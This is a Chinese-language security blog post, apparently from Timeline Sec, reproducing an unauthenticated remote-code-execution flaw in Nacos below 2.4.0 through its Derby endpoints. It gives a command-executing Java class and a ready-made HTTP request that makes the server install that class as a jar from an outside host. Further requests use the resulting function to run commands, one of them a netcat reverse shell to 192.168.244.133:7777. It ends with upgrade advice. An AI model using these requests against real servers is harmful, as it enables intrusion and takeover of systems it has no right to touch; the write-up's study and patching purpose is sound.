#  QVD-2024-26473：Nacos Derby未授权RCE漏洞   
 白帽子   2024-08-09 18:50  
  
>   
> 关注我们❤️，添加星标🌟，一起学安全！作者：hexixi@Timeline Sec 本文字数：3819阅读时长：2～4min 声明：仅供学习参考使用，请勿用作违法用途，否则后果自负  
  
## 0x01 简介  
  
Nacos 是一个用于动态服务发现和配置以及服务管理的平台，Derby 是一个Java 类库的形式对外提供服务的数据库引擎。  
## 0x02 漏洞概述  
  
Nacos Derby数据库接口/nacos/v1/cs/ops/derby 和 /nacos/v1/cs/ops/data/removal 存在条件竞争漏洞，攻击者可借此接口执行恶意SQL，加载恶意jar并注册函数，在未授权条件下利用 derby sql 注入漏洞（CVE-2021-29442）调用恶意函数来执行恶意代码。  
## 0x03 影响版本  
  
nacos < 2.4.0  
## 0x04 环境搭建  
  
从官方网站下载安装包，运行命令安装Windows环境  
```
./startup.cmd -m standalone

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjTx7hFgPqHzFfMaNMgykwgwYia7SLvp0QTNczwDjQNJ6GxNmaC5k2N9eGZPkMwWuQMr2jjfVcHKHQ/640?wx_fmt=png&from=appmsg "")  
  
也可使用docker搭建（注：需要配置/etc/docker/daemon.json）  
```
docker pull nacos/nacos-server:v2.3.2

docker run --name demo-nacos-server \
-p 8848:8848 \
-p 9848:9848 \
-p 9849:9849 \
--privileged=true \
--restart=always \
-e JVM_XMS=256m \
-e JVM_XMX=256m \
-e MODE=standalone \
-e PREFER_HOST_MODE=hostname \
-d nacos/nacos-server:v2.3.2

```  
## 0x05 漏洞复现  
  
idea编写一个恶意jar（下文中的  
Example.java）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjTx7hFgPqHzFfMaNMgykwguwYXHug2k3CITKt89JFPricgSFGm32uud1x04Lo8BG4VF4WqMlS5v6A/640?wx_fmt=png&from=appmsg "")  
  
jar生成  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjTx7hFgPqHzFfMaNMgykwg4epAYJMeHqfEn165sDofT9A0Pwku8yqtJtP9RC5ntWZCUIxEq5pzSA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjTx7hFgPqHzFfMaNMgykwgRj37RicOP2mqxZYSDN8S9Rb6eictynUc2XPanqe603Viav31rAibmrPYvA/640?wx_fmt=png&from=appmsg "")  
  
详细步骤见：  
https://blog.csdn.net/m0_73345433/article/details/136307983  
  
Example.java：  
```
package test.poc;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.StringWriter;

/* loaded from: Example.class */
public class Example {
    public static void main(String[] args) {
        String ret = exec("ipconfig");
        System.out.println(ret);
    }

    public static String exec(String cmd) {
        StringBuffer bf = new StringBuffer();
        try {
            String charset = "utf-8";
            String osName = System.getProperty("os.name");
            if (osName != null && osName.startsWith("Windows")) {
                charset = "gbk";
            }
            Process p = Runtime.getRuntime().exec(cmd);
            InputStream fis = p.getInputStream();
            InputStreamReader isr = new InputStreamReader(fis, charset);
            BufferedReader br = new BufferedReader(isr);
            while (true) {
                String line = br.readLine();
                if (line != null) {
                    bf.append(line);
                } else {
                    return bf.toString();
                }
            }
        } catch (Exception e) {
            StringWriter writer = new StringWriter();
            PrintWriter printer = new PrintWriter(writer);
            e.printStackTrace(printer);
            try {
                writer.close();
                printer.close();
            } catch (IOException e2) {
            }
            return "ERROR:" + writer.toString();
        }
    }
}

```  
  
  
使用python起一个web服务，能够访问到test.jar  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjTx7hFgPqHzFfMaNMgykwgFn3dfSIN9wBM7fBNGjCia8rxwQoa7wAYrFbRZUfgX8r2gl0kfj8mdqg/640?wx_fmt=png&from=appmsg "")  
  
构造请求，加载命令执行jar  
```
POST /nacos/v1/cs/ops/data/removal HTTP/1.1
Host: 192.168.229.1:8848
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Content-Length: 489
Content-Type: multipart/form-data; boundary=2a262c4e7ea55d81b1906382912b7422

--2a262c4e7ea55d81b1906382912b7422
Content-Disposition: form-data; name="file"; filename="file"

CALL sqlj.install_jar('http://192.168.244.133:8000/test.jar', 'NACOS.jtZJBFpM', 0)

        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS.jtZJBFpM')

        CREATE FUNCTION S_EXAMPLE_jtZJBFpM( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'

--2a262c4e7ea55d81b1906382912b7422--


```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjTx7hFgPqHzFfMaNMgykwgzuN5p0CQTtrtic8QSsnwAAlKqgYte8M9E4784cZWEXYnddkd9wRiajAg/640?wx_fmt=png&from=appmsg "")  
  
- 调用了一个 sqlj.install_jar 存储过程，用于安装一个 JAR 文件。该 JAR 文件被从http://192.168.244.133:8000/test.java下载  
  
- 调用了 SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY 存储过程，将属性 derby.database.classpath 的值设置为 NACOS.bGgDnUtc，使 Derby 数据库能够加载该 JAR 文件  
  
- 创建了一个名为 S_EXAMPLE_jtZJBFpM 的方法。该函数的具体实现是在 Java 类 test.poc.Example 的 exec 方法(因为是条件竞赛，id=jtZJBFpM可能会失效，可以用python随机生成)      
  
访问构造的方法，实现命令执行  
```
GET /nacos/v1/cs/ops/derby?sql=select%20*%20from%20(select%20count(*)%20as%20b%2c%20S_EXAMPLE_jtZJBFpM('calc')%20as%20a%20from%20config_info)%20tmp%20%2f*ROWS%20FETCH%20NEXT*%2f HTTP/1.1
Host: 192.168.229.1:8848
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close


```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjTx7hFgPqHzFfMaNMgykwgxIkKB8JkCG9WnRLOmRJIkgDrv7soCg1KIP2QTvHUCpibD19Hstv5OibA/640?wx_fmt=png&from=appmsg "")  
  
**反弹shell**打开监听端口  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjTx7hFgPqHzFfMaNMgykwg7ykDz7t7u5JwUNE3zzqP4AJVtmyx0kDMne3qDQQBHTUK7WiaUb3XWQg/640?wx_fmt=png&from=appmsg "")  
  
构造恶意请求  
```
GET /nacos/v1/cs/ops/derby?sql=select%20*%20from%20(select%20count(*)%20as%20b%2c%20S_EXAMPLE_jtZJBFpM('nc.exe%20-e%20cmd%20192.168.244.133%207777')%20as%20a%20from%20config_info)%20tmp%20%2f*ROWS%20FETCH%20NEXT*%2f HTTP/1.1
Host: 192.168.229.1:8848
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjTx7hFgPqHzFfMaNMgykwgiaogWxdl63TNF3QFghpRAzgsxOUWz5vaic3zSZrs98s5wZqSibQ5mgPkw/640?wx_fmt=png&from=appmsg "")  
  
成功收到 shell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjTx7hFgPqHzFfMaNMgykwg8V4NOyuUR6TLBpHf75Aff825YQxy92ZEvZynJXLT4yhamVSN1DeZLQ/640?wx_fmt=png&from=appmsg "")  
## 0x06 修复方式  
  
将组件 nacos 升级至 2.4.0 及以上版本  
## 参考链接  
  
https://www.oscs1024.com/hd/MPS-sxgr-j9ak  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VfLUYJEMVshRXmfDUFNGlTrAVB52XIXB6ibko0TibK4p8OGzoAXSoHSXvUwQk6FKTkNIslDL675W0QBOPfWmO6IA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
回复  
【加群】  
进入微信交流群回复  
【SRC群】进入SRC-QQ交流群回复  
【新人】领取新人学习指南资料回复  
【面试】获取渗透测试常见面试题回复  
【合作】获取各类安全项目合作方式回复  
【帮会】付费加入SRC知识库学习回复  
【  
培训】  
获取TimelineSec官方培训课程详情  
  
  
视频号：搜索  
TimelineSec  
  
官方微博：[#小程序://微博/tPbUYdN9EucSD4C]()  
  
  
哔哩哔哩：  
https://space.bilibili.com/52459  
‍1903  
  
  
  
❤  
  
觉得有用就点赞转发在看吧！  
  
想看什么欢迎评论区留言～  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OkhKF2m1syrmlAus2fxnsxZBk4oIuTvAVIaL6pKgic5DEa8ynqo44GUwNML3ggkqMpbE1fiaLYvpPzeBrQJCS5bA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
